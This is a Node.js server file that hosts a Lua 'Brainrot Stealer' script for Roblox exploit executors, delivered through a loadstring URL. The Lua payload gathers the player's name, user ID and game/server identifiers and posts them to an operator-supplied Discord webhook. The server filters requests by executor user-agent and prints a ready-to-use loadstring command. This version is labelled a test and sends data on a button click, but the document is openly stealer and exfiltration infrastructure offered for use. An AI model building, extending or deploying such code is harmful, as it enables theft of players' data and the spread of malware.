// server.js - COMPLETELY FIXED
const express = require("express");
const app = express();
const PORT = process.env.PORT || 3000;

// Webhook storage
const webhookStorage = new Map();

// Middleware
app.use(express.text({ type: '*/*' }));
app.use(express.json());

// BLOCK NON-EXECUTORS - RELAXED
function blockNonExecutor(req, res, next) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ref = (req.headers["referer"] || "").toLowerCase();

  const allowed = ua.includes("roblox") ||
                  ua.includes("synapse") ||
                  ua.includes("krnl") ||
                  ua.includes("fluxus") ||
                  ua.includes("executor") ||
                  ref.includes("roblox") ||
                  ua.includes("http") ||
                  true; // TEMPORARILY ALLOW ALL

  if (!allowed) {
    return res.status(403).send("Access denied");
  }
  next();
}

// TEST ENDPOINT - Check if server works
app.get("/test", (req, res) => {
  res.send("SERVER IS WORKING! Use /raw?wh=WEBHOOK_URL");
});

// STORE WEBHOOK ENDPOINT
app.post("/store", (req, res) => {
  const { id, webhook } = req.body;
  if (id && webhook && webhook.startsWith("https://discord.com/api/webhooks/")) {
    webhookStorage.set(id, webhook);
    res.send("OK");
  } else {
    res.status(400).send("Invalid data");
  }
});

// HOME
app.get("/", (req, res) => {
  res.send("Brainrot Stealer Server - Use /raw?wh=WEBHOOK_URL");
});

// /raw → RETURN LUA SCRIPT
app.get("/raw", blockNonExecutor, (req, res) => {
  let webhook = req.query.wh;
  const webhookId = req.query.id;

  console.log("RAW REQUEST:", { webhook, webhookId });

  // Get webhook from storage if ID provided
  if (webhookId && webhookStorage.has(webhookId)) {
    webhook = webhookStorage.get(webhookId);
  }

  if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
    return res.status(400).send("-- INVALID WEBHOOK -- Add ?wh=WEBHOOK_URL to your loadstring");
  }

  // SIMPLE LUA SCRIPT THAT DEFINITELY WORKS
  const luaScript = `-- Brainrot Stealer - Simple Test
print("Brainrot Stealer Loaded!")

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- Enable HTTP
pcall(function() HttpService.HttpEnabled = true end)

local WebhookURL = "${webhook}"

-- Simple HTTP function
local function sendToDiscord(message)
    local success, result = pcall(function()
        local data = {
            content = message,
            embeds = {
                {
                    title = "Brainrot Stealer - TEST",
                    description = "This is a test message from the stealer",
                    color = 65280,
                    fields = {
                        {
                            name = "Player Info",
                            value = "Name: " .. player.Name .. "\\nUserID: " .. player.UserId,
                            inline = true
                        },
                        {
                            name = "Game Info",
                            value = "Game: " .. game.PlaceId .. "\\nJobID: " .. game.JobId,
                            inline = true
                        }
                    },
                    footer = {
                        text = "Test Successful • " .. os.date("%X")
                    }
                }
            }
        }
        
        local json = HttpService:JSONEncode(data)
        
        if syn and syn.request then
            syn.request({
                Url = WebhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        elseif request then
            request({
                Url = WebhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = json
            })
        else
            HttpService:PostAsync(WebhookURL, json, Enum.HttpContentType.ApplicationJson)
        end
    end)
    
    return success
end

-- Create simple GUI
local function createGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TestStealer"
    screenGui.Parent = player.PlayerGui
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.Parent = screenGui
    
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0, 50)
    label.Position = UDim2.new(0, 0, 0, 0)
    label.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
    label.Text = "Brainrot Stealer - TEST"
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextSize = 18
    label.Font = Enum.Font.GothamBold
    label.Parent = frame
    
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0, 60)
    status.BackgroundTransparency = 1
    status.Text = "Status: Ready"
    status.TextColor3 = Color3.new(1, 1, 1)
    status.TextSize = 14
    status.Parent = frame
    
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 200, 0, 40)
    button.Position = UDim2.new(0.5, -100, 0.5, -20)
    button.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    button.Text = "SEND TEST TO DISCORD"
    button.TextColor3 = Color3.new(1, 1, 1)
    button.TextSize = 16
    button.Parent = frame
    
    button.MouseButton1Click:Connect(function()
        status.Text = "Status: Sending..."
        button.Text = "SENDING..."
        
        local success = sendToDiscord("Test from " .. player.Name)
        
        if success then
            status.Text = "Status: Sent Successfully!"
            button.Text = "SUCCESS!"
            wait(2)
            screenGui:Destroy()
            print("Test completed successfully!")
        else
            status.Text = "Status: Failed to send"
            button.Text = "FAILED - TRY AGAIN"
        end
    end)
    
    return screenGui
end

-- Wait for player
if not player then
    repeat wait() until Players.LocalPlayer
    player = Players.LocalPlayer
end

repeat wait() until player.PlayerGui

-- Create GUI
wait(1)
createGUI()

print("Brainrot Stealer GUI Created! Click the button to test.")

return "Brainrot Stealer Loaded Successfully!"`;

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  res.send(luaScript);
});

// 404 Handler
app.use((req, res) => {
  res.status(404).send("Endpoint not found");
});

// START SERVER
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server LIVE on port ${PORT}`);
  console.log(`✅ TEST: https://tommyfc555-github-io.onrender.com/test`);
  console.log(`📝 Loadstring: loadstring(game:HttpGet("https://tommyfc555-github-io.onrender.com/raw?wh=YOUR_WEBHOOK"))()`);
});
